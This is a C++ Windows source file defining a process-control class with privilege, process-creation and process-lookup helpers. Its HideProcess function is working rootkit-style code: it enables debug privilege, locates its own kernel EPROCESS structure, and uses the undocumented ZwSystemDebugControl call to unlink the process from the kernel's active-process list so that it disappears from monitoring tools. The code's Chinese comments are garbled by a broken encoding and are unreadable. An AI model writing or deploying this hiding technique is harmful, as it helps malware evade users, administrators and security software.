#include "ProcessControl.h"

CProcess::CProcess()
{
	m_ProcInfo.hProcess = NULL;
	m_ProcInfo.hThread = NULL;
	m_ProcInfo.dwProcessId = NULL;
	m_ProcInfo.dwThreadId = NULL;
}

CProcess::CProcess(HANDLE hProcessHand)
{
	m_ProcInfo.hProcess = hProcessHand;
	m_ProcInfo.hThread = NULL;
	m_ProcInfo.dwProcessId = NULL;
	m_ProcInfo.dwThreadId = NULL;
}

CProcess::~CProcess()
{
	if (m_ProcInfo.hProcess != NULL)
	{
		CloseHandle(m_ProcInfo.hProcess);
	}

	if (m_ProcInfo.hThread != NULL)
	{
		CloseHandle(m_ProcInfo.hThread);
	}
}

BOOL CProcess::EnableDebugPriv(PTCHAR name)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;
	//�򿪽������ƻ�
	(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken));
	//��ý��̱���ΨһID
	(LookupPrivilegeValue(NULL, name, &luid));

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tp.Privileges[0].Luid = luid;

	//����Ȩ��
	(AdjustTokenPrivileges(hToken, 0, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL));
	return 0;
}

BOOL CProcess::PrivilegeControl(ULONG uPrivilege,BOOLEAN bEnable,BOOLEAN bCurrentThread)
{
	typedef NTSTATUS (WINAPI* PRtlAdjustPrivilege) (ULONG uPrivilege,BOOLEAN bEnable,BOOLEAN bCurrentThread,PBOOLEAN pbEnabled);
	PRtlAdjustPrivilege RtlAdjustPrivilege;
	(RtlAdjustPrivilege = (PRtlAdjustPrivilege)GetProcAddress(LoadLibrary("ntdll.dll"),"RtlAdjustPrivilege"));
	BOOLEAN bTemp;
	return !(RtlAdjustPrivilege(uPrivilege,bEnable,bCurrentThread,&bTemp));
}

BOOL CProcess::InitializeFunction()
{
	//��ʼ��ʹ�ú���
	HMODULE hNtdll = GetModuleHandle("ntdll.dll");
	ZwSystemDebugControl = (PZWSYSTEMDEBUGCONTROL) GetProcAddress(hNtdll, "ZwSystemDebugControl");
	NtQuerySystemInformation =(PNTQUERYSYSTEMINFORMATION) GetProcAddress(hNtdll, "NtQuerySystemInformation");
	ZwAllocateVirtualMemory = (PZWALLOCATEVIRTUALMEMORY)GetProcAddress(hNtdll, "ZwAllocateVirtualMemory");
	ZwFreeVirtualMemory = (PZWFREEVIRTUALMEMORY)GetProcAddress(hNtdll, "ZwFreeVirtualMemory");
	return (ZwSystemDebugControl != NULL && NtQuerySystemInformation != NULL && ZwAllocateVirtualMemory != NULL && ZwFreeVirtualMemory != NULL);
}

BOOL CProcess::SystemDebugControl(ULONG uAddress,PVOID pvData,ULONG usize,SYSDBG_COMMAND command)
{        
	NTSTATUS status;
	MEMORY_CHUNKS datas;

	//����ڴ����ݽṹ
	datas.Address = uAddress;
	datas.Data = pvData;
	datas.Length = usize;

	//�޸��ڴ�
	status = ZwSystemDebugControl(command,&datas,sizeof(datas),NULL,NULL,NULL);
	if(NT_SUCCESS(status)) return TRUE;

	return FALSE;
}
BOOL CProcess::OperateSystemMemory(MEMORY_CHUNKS datas,SYSDBG_COMMAND command)
{        
	NTSTATUS status;

	//�޸��ڴ�
	PZWSYSTEMDEBUGCONTROL ZwSystemDebugControl;
	HMODULE hNtdll = GetModuleHandle("ntdll.dll");
	ZwSystemDebugControl = (PZWSYSTEMDEBUGCONTROL) GetProcAddress(hNtdll, "ZwSystemDebugControl");
	status = ZwSystemDebugControl(command,&datas,sizeof(MEMORY_CHUNKS),NULL,NULL,NULL);
	if(NT_SUCCESS(status)) return TRUE;

	return FALSE;
}
BOOL CProcess::HideProcess()
{
	EnableDebugPriv(SE_DEBUG_NAME);
	(InitializeFunction());

	//������Ϣ������
	PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
	DWORD buflen=0x10000,needlen=0;
	ULONG  uObjCnt = 0;
	NTSTATUS  status;
	BOOL bRet;
	HANDLE hProcess;

	//ͨ���򿪽��̻�ȡ���̾��
	hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,GetCurrentProcessId());

	//��ý��̶���ĵ�ַ
	PBYTE pBuf = NULL;
	do
	{
		//�����ѯ�����Ϣ������ڴ�
		ZwAllocateVirtualMemory(GetCurrentProcess(),(PVOID*)&pBuf,0,&buflen,MEM_COMMIT,PAGE_READWRITE);
		if (pBuf == NULL) return FALSE;
		//��ѯϵͳ�����Ϣ
		status=NtQuerySystemInformation(SystemHandleInformation,(PVOID)pBuf,buflen,&needlen);
		if (NT_SUCCESS(status)) break;
		//���ɹ�,���ͷ��ڴ�
		//����ֻҪһ����ڴ湻����Щ���ݾ���,����ֱ������һ���㹻���Ҳ����
		//���ص�needlen������Ϊ�ο�
		ZwFreeVirtualMemory(GetCurrentProcess(),(PVOID*)&pBuf,&buflen,MEM_RELEASE);
		//Ȼ���Ҫ������ڴ��С��2,ֱ���ɹ�Ϊֹ
		buflen *= 2;
		pBuf = NULL;
	} while(TRUE);

	uObjCnt = (ULONG)*(ULONG*)pBuf;
	DWORD dwEPROCESS;
	//ULONG dwCurrentPID;
	pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)(pBuf+sizeof(ULONG));
	if(NT_SUCCESS(status))
	{
		for(int i=0;i<(int)uObjCnt;i++)
		{
			( Out(Dbg,"pHandleInfo->Handle:%d pHandleInfo->ProcessID:%d \n",pHandleInfo->Handle,pHandleInfo->ProcessID));			
			if(pHandleInfo->Handle==(USHORT)hProcess && pHandleInfo->ProcessID==(ULONG)GetCurrentProcessId())/*pHandleInfo->ProcessID==dwPID && pHandleInfo->Handle==(USHORT)GetProcessHand()*/
			{

				dwEPROCESS = (DWORD)pHandleInfo->Object;
				Out(Dbg,"dwEPROCESS: 0x%x",(ULONG)dwEPROCESS);
				//dwCurrentPID = pHandleInfo->ProcessID;
				break;
			}
			pHandleInfo++;
		}
		//���õ���ǰ���̵�EPROCESS��ַ��,�ͷŵ��ڴ�
		ZwFreeVirtualMemory(GetCurrentProcess(),(PVOID*)&pBuf,&buflen,MEM_RELEASE);
		//�رվ��
		CloseHandle(hProcess);
		bRet = TRUE;
	}

	//FCHK(SystemDebugControl(dwEPROCESS+0x088,&list,sizeof(list),SysDbgCopyMemoryChunks_0));

	//FCHK(SystemDebugControl((ULONG)(list.Blink)+0x4,&list.Blink,sizeof(list.Blink),SysDbgCopyMemoryChunks_1));

	//FCHK(SystemDebugControl((ULONG)(list.Blink),&list.Flink,sizeof(list.Flink),SysDbgCopyMemoryChunks_1));
	MEMORY_CHUNKS datas;
	datas.Address = dwEPROCESS+0x088;
	LIST_ENTRY list = {0};
	datas.Data =&list;
	datas.Length = sizeof(list);
	OperateSystemMemory(datas,SysDbgCopyMemoryChunks_0);
	datas.Address = (ULONG)(list.Blink)+0x4;
	datas.Data =&list.Blink;
	datas.Length = sizeof(list.Blink);
	OperateSystemMemory(datas,SysDbgCopyMemoryChunks_1);
	datas.Address = (ULONG)(list.Blink);
	datas.Data =&list.Flink;
	datas.Length = sizeof(list.Flink);
	OperateSystemMemory(datas,SysDbgCopyMemoryChunks_1);
	return TRUE;
}

STATUS CProcess::GetCurrentProcessPath(LPTSTR lpProcessPath)
{
	TCHAR exeFullPath[MAX_PATH]; // MAX_PATH��WINDEF.h�ж����ˣ�����260
	TCHAR cDrive[MAX_PATH],cPath[MAX_PATH],cName[MAX_PATH];
	memset(exeFullPath,0,MAX_PATH);
	GetModuleFileName(NULL,exeFullPath,MAX_PATH);  
	_tsplitpath_s(exeFullPath,cDrive,cPath,cName,cName);
	_tcscpy_s (exeFullPath,cDrive);
	_tcscat_s (exeFullPath,cPath);
	_tcscpy_s(lpProcessPath,MAX_PATH,exeFullPath);
	return 0;
}

PROCESS_INFORMATION  CProcess::ProcessCreate(char * cProcessPath,char * cRunCommendLink)
{
	STARTUPINFO StatInfo = {sizeof(StatInfo)}; //��ʼ��STARTUPINFO �ṹ�Ĵ�С
	PROCESS_INFORMATION mProcInfo;//�ñ��������½����̵ı�־��Ϣ
	CreateProcess(cProcessPath, //���ڴ�ָ����ִ�е��ļ���
		cRunCommendLink, //�����в���
		NULL, //Ĭ�Ͻ��̰�ȫ����
		NULL, //Ĭ���̰߳�ȫ����
		FALSE, //ָ����ǰ�����ڵľ�������Ա��½��̼̳�
		NULL,   //ʹ��Ĭ�ϵĴ�����ʽ
		NULL,   //ʹ�ñ����̵Ļ�������
		NULL,   //ʹ�ñ����̵�Ŀ¼
		&StatInfo,    //ʹ��Ĭ�ϵ���ʾ��ʽ
		&mProcInfo); //�����½����̵ı�־��Ϣ
	return mProcInfo;
}
BOOL CProcess::HaveProcess (PPROCESSINFO pProcess)
{

	PROCESSENTRY32 pe32;
	// ��ʹ������ṹ֮ǰ�����������Ĵ�С
	pe32.dwSize = sizeof(pe32);
	// ��ϵͳ�ڵ����н�����һ������
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(hProcessSnap == INVALID_HANDLE_VALUE)
	{
		Out(Dbg," CreateToolhelp32Snapshot����ʧ�ܣ� /n");
		//return;
	}
	// �������̿��գ�������ʾÿ�����̵���Ϣ
	BOOL bMore = Process32First(hProcessSnap, &pe32);
	while(bMore)
	{
		if(0 == _tcscmp(pe32.szExeFile, pProcess->sExeFile))
		{
			pProcess->dwProcessId = pe32.th32ProcessID;
			CloseHandle(hProcessSnap);
			return TRUE;
		}
		bMore = Process32Next(hProcessSnap, &pe32);
	}
	// ��Ҫ���������snapshot����
	CloseHandle(hProcessSnap);
	return FALSE;
}
HANDLE CProcess::GetProcessHand()
{
	return m_ProcInfo.hProcess;
}

HANDLE CProcess::GetThreadHand()
{
	return m_ProcInfo.hThread;
}

DWORD CProcess::GetProcessID()
{
	return m_ProcInfo.dwProcessId;
}

DWORD CProcess::GetThreadID()
{
	return m_ProcInfo.dwThreadId;
}
